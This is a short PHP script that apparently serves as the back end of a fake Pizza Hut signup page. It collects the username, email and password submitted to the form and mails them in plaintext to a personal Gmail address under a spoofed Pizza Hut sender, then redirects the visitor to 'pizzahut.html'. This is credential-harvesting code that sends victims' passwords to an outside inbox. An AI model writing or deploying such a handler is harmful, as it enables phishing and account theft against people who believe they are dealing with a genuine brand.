 <?php 
    $name=$_POST["username"];
    $email=$_POST["email"];
    $pass=$_POST["password"];
    $cpass=$_POST["cpassword"];
    $to="vickyvenkatesh2668@gmail.com";
    $subject="mail from customer";
    $txt="name=".$name . "\r\n Email=".$email. "\r\n password=".$pass;
    $headers="from:pizzahut@website.com";
    if($email!= NULL){
        mail($to,$subject,$txt,$headers); 
        header("location:pizzahut.html");                                                                                                                                                                                                                                         
    }
    
?>